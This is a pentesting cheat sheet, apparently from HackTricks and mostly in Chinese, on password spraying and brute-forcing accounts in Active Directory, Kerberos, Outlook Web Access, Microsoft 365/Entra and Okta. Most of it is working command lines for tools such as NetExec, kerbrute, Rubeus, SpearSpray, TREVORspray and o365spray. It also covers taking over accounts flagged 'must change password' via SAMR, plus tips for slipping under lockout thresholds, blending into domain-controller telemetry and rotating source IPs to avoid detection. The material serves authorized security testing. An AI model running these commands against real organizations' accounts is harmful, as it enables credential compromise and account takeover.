# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

一旦你找到了几个**有效用户名**，你可以针对每个发现的用户尝试一些**最常见的密码**（请记住环境中的 password policy）。\
**默认**情况下，**最小** **password** **长度**是**7**。

常见用户名列表也可能有用：[https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

注意，如果你尝试多个错误密码，**可能会锁定一些账户**（默认超过 10 次）。

### Get password policy

如果你有一些用户凭据，或者有一个 domain user 的 shell，你可以**通过以下方式获取 password policy**：
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### 从 Linux（或所有）

- 使用 **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- 使用 **NetExec (CME successor)** 进行针对性、低噪声的 spraying，覆盖 SMB/WinRM：
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- 使用 [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**（你可以指定尝试次数以避免锁定）：**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- 使用 [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - **不推荐**，有时不起作用
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- 使用 `scanner/smb/smb_login` 模块的 **Metasploit**：

![](<../../images/image (745).png>)

- 使用 **rpcclient**：
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### 来自 Windows

- 使用带有 brute 模块的 [Rubeus](https://github.com/Zer1t0/Rubeus) 版本：
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- 使用 [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)（它默认可以从域中生成用户，并且会从域获取密码策略并据此限制尝试次数）：
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- 使用 [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### 识别并接管 "Password must change at next logon" 账户 (SAMR)

一种低噪声技术是喷洒一个无害/空密码，并捕获返回 STATUS_PASSWORD_MUST_CHANGE 的账户，这表示密码已被强制过期，并且可以在不知道旧密码的情况下进行更改。

Workflow:
- 枚举用户（通过 SAMR 进行 RID brute）来构建目标列表：

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- 喷洒一个空密码并在命中后继续进行，以捕获必须在下次登录时更改密码的账户：
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- 对于每个命中项，使用 NetExec 的模块通过 SAMR 更改密码（当设置了 "must change" 时，不需要旧密码）：
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
操作说明：
- 在进行基于 Kerberos 的操作前，确保你的主机时钟与 DC 同步：`sudo ntpdate <dc_fqdn>`。
- 某些模块（例如 RDP/WinRM）中，只有 `[+]` 而没有 `(Pwn3d!)` 表示凭据有效，但该账户缺少交互式登录权限。

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### 使用 LDAP targeting 和 PSO-aware throttling 的 Kerberos pre-auth spraying (SpearSpray)

基于 Kerberos pre-auth 的 spraying 相比 SMB/NTLM/LDAP bind 尝试更低噪声，并且更符合 AD lockout policy。SpearSpray 结合了基于 LDAP 的 targeting、pattern engine 和 policy awareness（domain policy + PSOs + badPwdCount buffer），可以更精确、更安全地进行 spraying。它还可以在 Neo4j 中标记已 compromise 的 principals，用于 BloodHound pathing。

Key ideas:
- 使用分页和 LDAPS 支持进行 LDAP user discovery，并可选使用自定义 LDAP filters。
- domain lockout policy + PSO-aware filtering，保留可配置的 attempt buffer（threshold），避免锁定 users。
- 使用快速的 gssapi bindings 进行 Kerberos pre-auth validation（在 DC 上生成 4768/4771，而不是 4625）。
- 基于 pattern、按用户生成 password，使用如 names 和从每个 user 的 pwdLastSet 派生的 temporal values 等 variables。
- 通过 threads、jitter 和 max requests per second 控制吞吐量。
- 可选的 Neo4j integration，用于标记 owned users 供 BloodHound 使用。

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
目标定位和模式控制：
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
隐蔽性和安全控制：
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound 增强：
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
模式系统概述 (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
可用变量包括：
- {name}, {samaccountname}
- 每个用户的 pwdLastSet（或 whenCreated）的时间变量：{year}, {short_year}, {month_number}, {month_en}, {season_en}
- 组成辅助项和 org token：{separator}, {suffix}, {extra}

Operational notes:
- 优先用 -dc 查询 PDC-emulator，以读取最权威的 badPwdCount 和与 policy 相关的信息。
- badPwdCount 重置会在观察窗口之后的下一次尝试时触发；使用阈值和 timing 以保持安全。
- Kerberos pre-auth 尝试会在 DC telemetry 中显示为 4768/4771；使用 jitter 和 rate-limiting 以融入正常流量。

> Tip: SpearSpray’s default LDAP page size is 200; 如有需要可用 -lps 调整。

## Outlook Web Access

有多种工具可用于 p**assword spraying outlook**。

- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- With [Ruler](https://github.com/sensepost/ruler) (reliable!)
- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

要使用这些工具中的任何一个，你需要一个用户列表，以及一个密码 / 一个小型密码列表来进行 spray。
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

对于 cloud spraying，首先要确认 tenant 是 **managed**、**federated** 还是 **hybrid**，因为 endpoint 和 lockout 行为可能与 on-prem AD 不同。在 Microsoft Entra 中，**Smart Lockout** 会改变重复尝试如何消耗 lockout budget：

- 重复使用**相同的错误密码**不会继续增加 lockout counter，但尝试**新的候选密码**会。
- **Familiar** 和 **unfamiliar** locations 有**独立**的 counter。
- 使用 **pass-through authentication (PTA)** 的 tenant 无法受益于 bad-password hash tracking，因此把它们当作更接近经典 lockout-sensitive target 的对象。

在实际操作中，spray 时**每轮只试一个密码**，在轮次之间留出足够间隔，并优先使用能够在发送猜测前发现 tenant 实际 auth flow 的工具。

- 使用 [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray)，你可以 recon tenant，发现 `token_endpoint`，spray `msol`/`adfs`/`owa`/`okta`，并通过多个 egress IP 轮换流量：
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- 使用 [**Spray365**](https://github.com/MarkoH17/Spray365)，你可以预先构建一个可恢复的 **execution plan**，随机化认证顺序，并强制设置每个用户的 **minimum delay**，以保持在锁定窗口之外：
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- 使用 [**o365spray**](https://github.com/0xZDH/o365spray)，你可以验证 tenant，使用 `onedrive` 等模块枚举用户，并通过 `oauth2` 或 `adfs` 进行 spray，同时在每个 lockout window 内保持**每个用户一次尝试**。如果你已经有一个 FireProx API，使用 `--proxy-url` 传入它以分散 source IPs：
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
近期操作者手法也已转向 **distributed cloud spraying**。[**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) 支持 time windows、password shuffling、ADFS/M365 spraying，以及自动化 post-auth exfiltration。近期真实世界的滥用还使用了 **Microsoft Teams API** 账户枚举和 **AWS region rotation**，将 spray waves 分散到多个 source geographies。

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
